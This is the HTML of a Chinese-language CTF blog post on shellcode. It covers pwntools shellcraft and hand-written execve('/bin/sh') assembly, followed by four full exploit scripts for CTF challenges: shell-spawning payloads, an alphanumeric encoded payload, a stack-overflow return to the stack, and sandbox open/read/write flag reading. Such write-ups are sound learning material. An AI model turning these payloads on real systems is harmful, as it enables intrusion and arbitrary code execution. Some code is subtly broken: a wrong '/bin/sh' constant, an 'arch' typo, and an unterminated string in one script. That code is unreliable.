@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/lll.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/lll.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"hgg-bat.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="Shellcode ¶原理 在pwn中shellcode利用方式一般为触发中断（int 0x80 或 syscall）来进行系统调用 system(&quot;&#x2F;bin&#x2F;sh&quot;)，实际上就是调用execve(&quot;&#x2F;bin&#x2F;sh&quot;,0,0)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellcode">
+<meta property="og:url" content="https://hgg-bat.github.io/2021/10/04/shellcode/index.html">
+<meta property="og:site_name" content="Haruki">
+<meta property="og:description" content="Shellcode ¶原理 在pwn中shellcode利用方式一般为触发中断（int 0x80 或 syscall）来进行系统调用 system(&quot;&#x2F;bin&#x2F;sh&quot;)，实际上就是调用execve(&quot;&#x2F;bin&#x2F;sh&quot;,0,0)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/8spatck2bpkcvt8mm9zt1fcz/1.png">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/yy6gc7b9ficlvskr65bow8oi/2.png">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/uh8qelgi14ohooggd5leq8xx/3.png">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/geyqzixywspeaygt9mbfbt63/4.png">
+<meta property="og:image" content="http://static.zybuluo.com/hgggg/8fpecaqjnig5pzidt5eziv8c/5.png">
+<meta property="og:image" content="https://hgg-bat.github.io/2021/10/04/shellcode/images/6.png">
+<meta property="og:image" content="https://hgg-bat.github.io/2021/10/04/shellcode/images/7.png">
+<meta property="og:image" content="https://hgg-bat.github.io/2021/10/04/shellcode/images/8.png">
+<meta property="article:published_time" content="2021-10-04T02:51:34.000Z">
+<meta property="article:modified_time" content="2021-10-04T02:53:41.329Z">
+<meta property="article:author" content="haruki">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://static.zybuluo.com/hgggg/8spatck2bpkcvt8mm9zt1fcz/1.png">
+
+
+<link rel="canonical" href="https://hgg-bat.github.io/2021/10/04/shellcode/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hgg-bat.github.io/2021/10/04/shellcode/","path":"2021/10/04/shellcode/","title":"shellcode"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>shellcode | Haruki</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+  <a target="_blank" rel="noopener" href="https://github.com/hgg-bat" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Haruki</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">Shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.0.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F"><span class="nav-number">1.0.2.</span> <span class="nav-text">示例程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#syscall-%E8%B0%83%E7%94%A8%E8%A1%A8"><span class="nav-number">1.0.3.</span> <span class="nav-text">syscall 调用表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8pwntools%E7%94%9F%E6%88%90shellcode"><span class="nav-number">1.0.4.</span> <span class="nav-text">使用pwntools生成shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">1.0.5.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mrctf2020-shellcode"><span class="nav-number">1.0.5.1.</span> <span class="nav-text">mrctf2020_shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#exp"><span class="nav-number">1.0.5.1.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mrctf2020-shellcode-revenge"><span class="nav-number">1.0.5.2.</span> <span class="nav-text">mrctf2020_shellcode_revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#exp-v2"><span class="nav-number">1.0.5.2.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ciscn-s-6"><span class="nav-number">1.0.5.3.</span> <span class="nav-text">ciscn_s_6</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#exp-v3"><span class="nav-number">1.0.5.3.1.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#exp-v4"><span class="nav-number">1.0.5.3.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="haruki"
+      src="/images/tou.png">
+  <p class="site-author-name" itemprop="name">haruki</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/hgg-bat" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hgg-bat" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/jingyue425105@163.com" title="E-Mail → jingyue425105@163.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://haruki.github.io/" title="https:&#x2F;&#x2F;haruki.github.io" rel="noopener" target="_blank">haruki</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hgg-bat.github.io/2021/10/04/shellcode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/tou.png">
+      <meta itemprop="name" content="haruki">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Haruki">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          shellcode
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-10-04 10:51:34 / 修改时间：10:53:41" itemprop="dateCreated datePublished" datetime="2021-10-04T10:51:34+08:00">2021-10-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1>Shellcode</h1>
+<h3 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h3>
+<pre><code>在pwn中shellcode利用方式一般为触发中断（int 0x80 或 syscall）来进行系统调用
+system(&quot;/bin/sh&quot;)，实际上就是调用execve(&quot;/bin/sh&quot;,0,0)
+</code></pre>
+<span id="more"></span>
+<h3 id="示例程序"><a class="header-anchor" href="#示例程序">¶</a>示例程序</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -m32 1.c -o shell</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="syscall-调用表"><a class="header-anchor" href="#syscall-调用表">¶</a>syscall 调用表</h3>
+<pre><code>https://publicki.top/syscall.html
+</code></pre>
+<h3 id="使用pwntools生成shellcode"><a class="header-anchor" href="#使用pwntools生成shellcode">¶</a>使用pwntools生成shellcode</h3>
+<p>32位</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;1386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
+<p>64位</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
+<p>mips</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;mips&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh())</span><br></pre></td></tr></table></figure>
+<p>arm</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context(log_level= <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;aarch64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.aarch64.linux.sh())</span><br></pre></td></tr></table></figure>
+<p><strong>坑</strong></p>
+<pre><code>在运行生成mips和arm架构的shellcode时会有一系列的报错
+这里给出解决方案
+git clone https://github.com/Gallopsled/pwntools-binutils
+cd pwntools-binutils/ubuntu
+chmod +x install_all.sh
+./install_all.sh arm
+</code></pre>
+<h3 id="例题"><a class="header-anchor" href="#例题">¶</a>例题</h3>
+<h4 id="mrctf2020-shellcode"><a class="header-anchor" href="#mrctf2020-shellcode">¶</a>mrctf2020_shellcode</h4>
+<p><img src="http://static.zybuluo.com/hgggg/8spatck2bpkcvt8mm9zt1fcz/1.png" alt="1.png-65.6kB"></p>
+<p>从ida中我们可以看到，程序的功能为读入0x400字节，然后执行读入的内容<br>
+<img src="http://static.zybuluo.com/hgggg/yy6gc7b9ficlvskr65bow8oi/2.png" alt="2.png-150.2kB"></p>
+<p>同时栈上有可执行权限</p>
+<p>那接下来编写exp</p>
+<h5 id="exp"><a class="header-anchor" href="#exp">¶</a>exp</h5>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;sp&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26936</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;mrctf2020_shellcode&#x27;)</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e6922f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode1 = asm(shellcode1)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Show me your magic!&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>但是在CTF比赛中往往会对输入长度进行限制所以有时也需要自己编写shellcode</p>
+<h4 id="mrctf2020-shellcode-revenge"><a class="header-anchor" href="#mrctf2020-shellcode-revenge">¶</a>mrctf2020_shellcode_revenge</h4>
+<p>本题与上一题相似，不过却只能用可见字符构造shellcode,这里使用alpha3来生成<br>
+<img src="http://static.zybuluo.com/hgggg/uh8qelgi14ohooggd5leq8xx/3.png" alt="3.png-91kB"></p>
+<h5 id="exp-v2"><a class="header-anchor" href="#exp-v2">¶</a>exp</h5>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> ```python</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29931</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Show me your magic!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e6922f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode1 = asm(shellcode1)</span></span><br><span class="line"><span class="string">print(shellcode1)</span></span><br><span class="line"><span class="string">payload1 = &#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = &#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M150m0M0R2o7O2q0H0k10030O2J142M0H2N160Y0m0H18140l07121L0m0L121M0c7L0m1O0m0N0V0o11010H2L130R2j0l0l2t100Q0m0J110y2Z0m&#x27;</span></span><br><span class="line"><span class="string">r.send(payload1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r.interactive()</span></span><br></pre></td></tr></table></figure>
+<h4 id="ciscn-s-6"><a class="header-anchor" href="#ciscn-s-6">¶</a>ciscn_s_6</h4>
+<p>IDA分析<br>
+<img src="http://static.zybuluo.com/hgggg/geyqzixywspeaygt9mbfbt63/4.png" alt="4.png-31.2kB"></p>
+<p><img src="http://static.zybuluo.com/hgggg/8fpecaqjnig5pzidt5eziv8c/5.png" alt="5.png-14.8kB"><br>
+思路</p>
+<pre><code>pwn函数存在明显的栈溢出，我们可以通过读入shellcode并将返回地址覆盖为jmp esp之后去调用之前的shellcode
+由于输入长度限制，本题需手写shellcode
+</code></pre>
+<h5 id="exp-v3"><a class="header-anchor" href="#exp-v3">¶</a>exp</h5>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x8048554</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26139</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;ciscn_s_9&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov al,0xb</span></span><br><span class="line"><span class="string">int 0x80                </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line">payload = shellcode.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">0</span>) +p32(ret_addr) + asm(<span class="string">&quot;sub esp,40;call esp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>####pwnable_orw<br>
+题目分析<br>
+<img src="images/6.png" alt="pic"></p>
+<p><img src="images/7.png" alt="pic"></p>
+<p>查看沙盒<br>
+<img src="images/8.png" alt="pic"></p>
+<p>发现只能使用open,read,write,那么我们就可以通过open(file)+read(file)+write(file)来实现任意文件读取</p>
+<h5 id="exp-v4"><a class="header-anchor" href="#exp-v4">¶</a>exp</h5>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25539</span>)</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;orw&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fas fa-angle-double-up"></i> 笔记</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
